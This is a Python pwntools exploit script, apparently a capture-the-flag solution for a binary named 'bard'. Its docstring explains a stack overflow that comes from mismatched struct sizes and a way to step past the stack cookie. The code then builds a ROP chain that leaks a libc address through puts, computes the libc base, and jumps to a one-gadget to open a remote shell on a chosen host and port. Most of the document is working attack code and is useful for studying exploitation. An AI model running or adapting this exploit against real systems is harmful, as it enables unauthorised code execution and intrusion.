#!/usr/bin/env python3
from pwn import *
import sys

'''
This challenge has a buffer of size 0x1e0 allocated on the stack in the function at 0x400f7c.
It is used to hold 10 bard structures which can be one of two types each of which have different sizes.

struct good_bard {
    +0x00 weapon             // Can be either 'x' or 'l'
    +0x02 uint16_t           // statically set to 0x14
    +0x04 uint32_t           // staticall set to 0xf
    +0x08 uint8_t name[0x20] // This is read in from the user
    +0x28 uint64_t           // statically set to 0x4032000000000000 from 0x401660
} // total size 0x30 bytes

struct evil_bard {
    +0x00 weapon            // Can be either 's' or 'c'
    +0x08 uint64_t           // statically set to 0x4032000000000000 from 0x401660
    +0x10 uint32_t           // staticall set to 0xf
    +0x14 uint16_t           // statically set to 0x14
    +0x16 uint8_t name[0x20] // This is read in from the user
} // total size 0x38 bytes

There are two additional bytes at the end of the evil_bard struct that are never accessed. This size value
is returned by the function 0x400eb7 if the evil bard path is selected. The return value is set at 0x400f52
and is added to the index into the bard buffer at 0x400f52.

With 10 bards and a maximum struct size of 0x38 the potential overwrite size is 0x230. However, there is a
stack cookie. To bypass this you can choose the bards in such a way that the name field lands on the location
of the stack cookie. By making a short name it is possible to not overwrite the cookie. It is possible for
this bug to fail is the cookie contains a newline since it will be replaced by a "\x00"

The distance from the start of the bard_struct array to the stack cookie is 0x1e8.


'''

def send_evil_bard( s, name ):
    ## consume the alignment prompt
    s.readline()

    ## Choose the dark side
    s.send(b'e\n')

    ## Consume the weapon prompt
    s.recvuntil(b'ntment\n')

    ## This doesn't really matter
    s.send(b'1\n')

    ##Send the name

    if len(name) < 0x20:
        name += b'\n'

    s.send(name)

    ## Consume the newline
    s.readline()

    return

def send_good_bard( s, name ):
    ## consume the alignment prompt
    s.readline()

    ## Choose the dark side
    s.send(b'g\n')

    ## Consume the weapon prompt
    s.recvuntil(b'acy\n')

    ## This doesn't really matter
    s.send(b'1\n')

    ##Send the name

    if len(name) < 0x20:
        name += b'\n'

    s.send(name)

    ## Consume the newline
    s.readline()

    return

def do_leak( c, bardelf ):
    print('[INFO] Beginning leak')

    ## Consume until the dots
    c.recvuntil(b'...\n\n')

    ## First I want a good bard
    send_good_bard( c, b'a'*0x20)

    ## I want 7 evil bards to get me close to the cookie
    for _ in range(7):
        send_evil_bard( c, b'a'*0x20)

    ## This bard will skip the cookie
    send_evil_bard( c, b'')

    ## At this point the index is at the saved return address
    ## This means we need to use the good bard to do our overflow and start the rop chain
    ## This will give us 0x20 bytes for a rop chain

    ## 0x0000000000401143 : pop rdi ; ret
    pop_rdi = p64(0x401143)

    chain = pop_rdi
    chain += p64(bardelf.symbols['got.puts'])    ## becomes rdi
    chain += p64(bardelf.symbols['puts'])        ## print out the pointer
    chain += p64(0x40107b)                      ## jump back to main

    print('[INFO] Bards sent, cookie bypassed.')

    send_good_bard( c, chain)

    ## Loop through the encounter code for each bard
    for _ in range(10):
        c.recvuntil(b'(r)un\n')
        c.send(b'r\n')

    ## consume the last bit
    c.readline()

    leak = u64( c.recvuntil(b'\n', drop=True).ljust(8, b'\x00') )

    return leak

def do_shell( c, libc ):
    print('[INFO] Beginning shell popping')

    ## Consume until the dots
    c.recvuntil(b'...\n\n')

    ## First I want a good bard
    send_good_bard( c, b'a'*0x20)

    ## I want 7 evil bards to get me close to the cookie
    for _ in range(7):
        send_evil_bard( c, b'a'*0x20)

    ## This bard will skip the cookie
    send_evil_bard( c, b'')

    ## At this point the index is at the saved return address
    ## This means we need to use the good bard to do our overflow and start the rop chain
    ## This will give us 0x20 bytes for a rop chain
    ## 0x0000000000401143 : pop rdi ; ret
    pop_rdi = p64(0x401143)

    binsh = p64(libc.address + 0x1b40fa)
    
    ## The oneshot is a location in libc where all the arguments to 
    ##  execve are set up for you
    oneshot = p64(libc.address + 0x004f3c2)

    chain = oneshot
    
    print('[INFO] Bards sent, cookie bypassed.')

    send_good_bard( c, chain)

    ## Loop through the encounter code for each bard
    for _ in range(10):
        c.recvuntil(b'(r)un\n')
        c.send(b'r\n')

    c.interactive()

    return

def main(host, port):
    ## Open the binary
    bardelf = ELF('./bard')

    ## Open libc
    libc = ELF('./libc-2.27.so')

    try:
        c = remote(host,port)
    except:
        print('[ERROR] Failed to connect {0}:{1}'.format(host, port))
        exit(1)

    leak = do_leak(c, bardelf)

    libc.address = leak - libc.symbols['puts']

    print('[INFO] libc base: 0x%.8x' %(libc.address))

    input('...')
    do_shell(c, libc)

    c.close()


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('[USAGE] %s <target> port>' %sys.argv[0])
        exit(1)

    main( sys.argv[1], int(sys.argv[2]))
